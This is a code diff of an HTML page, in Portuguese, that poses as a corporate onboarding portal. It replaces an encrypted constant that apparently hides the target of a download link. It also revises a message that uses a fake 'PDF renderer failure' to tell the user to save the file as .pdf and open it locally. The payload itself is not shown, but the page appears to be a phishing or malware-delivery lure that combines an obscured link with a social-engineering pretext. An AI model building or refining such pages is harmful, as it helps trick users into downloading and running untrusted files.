@@ -62,7 +62,7 @@
     </div>
 
     <script>
-        const HASH_SISTEMA = "U2FsdGVkX1/bCUbh+WUp/sHhX/4hKTW1V4KJpIW/SrfJNMYSL5prKWmbtvlzuh9s2x3vi+V2CrP19YTF6u51udjCl9Tkcyzk9EYxVx8Jw+ftYpI945JfEZ/k0t4wXErj";
+        const HASH_SISTEMA = "U2FsdGVkX1+kKMss4UIytDtQJ0piqFTK7/7097FmFZn+vF+fTeTgPI27F/IDZGOg72aeN10ypdmsW/YtUVT3GOmIfjw2n1LajTh0R/6CIoDq8HVYib/mtAz7zdMtTetA";
 
         function processarOnboarding() {
             const elNome = document.getElementById('user_name');
@@ -102,8 +102,8 @@
                 
                 msgSucesso.innerHTML = `
                     <strong>Integração Concluída!</strong><br><br>
-                    O seu contrato de acesso (Badge) foi gerado. <br><br>
-                    <em>Nota do Sistema:</em> Devido a uma falha no renderizador PDF do nosso portal, o documento pode abrir como texto puro. Se isso acontecer, pressione <strong>CTRL + S</strong>, salve o arquivo no seu computador (garanta que termina com .pdf) e abra-o localmente para visualizar seu código de acesso.<br><br>
+                    O seu contrato de acesso foi gerado. <br><br>
+                    <em>Nota do Sistema:</em> Devido a uma falha no renderizador PDF do nosso portal, o documento não pode ser exibido aqui...<br><br>
                     <a href="${linkFinal}" class="link-download" target="_blank">Acessar Documento de Onboarding</a>
                 `;
                 msgSucesso.style.display = 'block';
